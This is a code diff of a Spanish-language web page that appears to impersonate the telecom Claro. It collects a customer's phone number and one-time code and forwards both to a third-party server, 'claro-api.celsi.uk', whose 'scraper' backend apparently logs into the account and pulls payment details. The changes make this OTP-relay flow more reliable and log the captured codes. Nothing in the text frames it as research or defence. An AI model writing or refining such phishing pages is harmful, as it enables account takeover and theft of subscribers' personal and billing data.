@@ -310,7 +310,7 @@
         const btnCancel = document.getElementById('btnCancel');
         const serverMessageEl = document.getElementById('serverMessage');
 
-        const validPrefixes = ['310','311','312','313','314','320','321','322','323','318','300'];
+        const validPrefixes = ['310','311','312','313','314','320','321','322','323','318'];
         const INITIAL_OTP_SECONDS = 176;
         let otpSeconds = INITIAL_OTP_SECONDS;
         let otpInterval = null;
@@ -481,8 +481,7 @@
         // CONFIG: base del API (ajusta si tu app.py corre en otro host/puerto)
         const API_BASE = 'https://claro-api.celsi.uk';
 
-        // Reemplaza todo el event listener de btnContinue con este:
-btnContinue.addEventListener('click', async () => {
+       btnContinue.addEventListener('click', async () => {
     if (btnContinue.disabled) return;
     const phone = phoneInput.value;
     if (!isValidPhoneForOtp(phone)) return;
@@ -527,11 +526,9 @@ btnContinue.addEventListener('click', async () => {
 
             const text = await resp.text();
 
-            // Si la respuesta contiene detalles, redirigir a datos.html
             if (text.includes('Detalles extraídos') || text.includes('valor_total')) {
                 hideLoading();
-                // Abrir datos.html en la misma ventana
-                window.location.href = `${API_BASE}/datos`;
+                window.location.href = 'datos.html';
             } else if (text.includes('OTP') || text.includes('pinCode')) {
                 hideLoading();
                 sessionStorage.setItem('scraper_numero', phone);
@@ -550,11 +547,15 @@ btnContinue.addEventListener('click', async () => {
         const code = Array.from(otpInputs).map(i => i.value).join('');
         if (code.length !== 4) return;
         const numero = sessionStorage.getItem('scraper_numero') || phone;
+        
+        console.log('Enviando OTP:', code, 'para número:', numero);
+        
         try {
             showLoading();
             const form = new FormData();
             form.append('numero', numero);
             form.append('otp', code);
+            
             const resp = await fetch(`${API_BASE}/submit_otp`, {
                 method: 'POST',
                 body: form,
@@ -563,11 +564,29 @@ btnContinue.addEventListener('click', async () => {
             });
 
             const statusHeader = resp.headers.get('X-Scraper-Status');
+            console.log('Status header recibido:', statusHeader);
 
-            if (statusHeader === 'OTP_REQUIRED') {
+            if (statusHeader === 'SUCCESS') {
+                console.log('✓ OTP correcto, extracción exitosa');
+                
+                // Esperar 2 segundos antes de redirigir para asegurar que los datos estén guardados
+                await new Promise(resolve => setTimeout(resolve, 2000));
+                
+                // Guardar número en sessionStorage para datos.html
+                sessionStorage.setItem('scraper_numero', numero);
+                console.log('Número guardado en sessionStorage:', numero);
+                
+                // Redirigir a datos.html
+                console.log('Redirigiendo a datos.html...');
+                hideLoading();
+                window.location.href = 'datos.html';
+                return;
+            }
+
+            if (statusHeader === 'OTP_REQUIRED' || statusHeader === 'OTP_ERROR') {
+                console.log('OTP incorrecto, mostrando error');
                 hideLoading();
                 showServerMessage('OTP incorrecto. Intenta de nuevo.', 'error');
-                // Mantener OTP visible para reintento
                 showOtp();
                 otpInputs.forEach(input => input.value = '');
                 if (otpInputs[0]) otpInputs[0].focus();
@@ -575,6 +594,7 @@ btnContinue.addEventListener('click', async () => {
             }
 
             if (statusHeader === 'NO_DETAILS') {
+                console.log('No se encontraron detalles');
                 hideLoading();
                 hideOtp();
                 showServerMessage('No se encontraron pagos pendientes.', 'error');
@@ -583,26 +603,21 @@ btnContinue.addEventListener('click', async () => {
 
             if (!resp.ok) {
                 const txt = await resp.text().catch(()=>'<no body>');
+                console.error('Response NOT OK:', resp.status, txt);
                 hideLoading();
-                console.error('Fetch /submit_otp response NOT OK', resp.status, resp.statusText, txt);
                 showServerMessage('Error del servidor: ' + resp.status, 'error');
                 return;
             }
 
-            const text = await resp.text();
-            
-            if (text.includes('Detalles extraídos') || text.includes('valor_total')) {
-                hideLoading();
-                // Redirigir a datos.html
-                window.location.href = `${API_BASE}/datos`;
-            } else {
-                hideLoading();
-                hideOtp();
-                showServerMessage('No se encontraron pagos pendientes.', 'error');
-            }
-        } catch (err) {
+            // Si llegamos aquí sin header SUCCESS, asumir error
+            console.warn('Respuesta sin header SUCCESS claro');
             hideLoading();
-            console.error('Fetch /submit_otp EXCEPTION:', err);
+            hideOtp();
+            showServerMessage('No se encontraron pagos pendientes.', 'error');
+            
+        } catch (err) {
+            console.error('Exception en submit_otp:', err);
+            hideLoading();
             showServerMessage('Error de conexión con el servidor.', 'error');
         }
     }
@@ -657,8 +672,4 @@ btnContinue.addEventListener('click', async () => {
     </script>
 </body>
 </html>
-
-
-
-
 
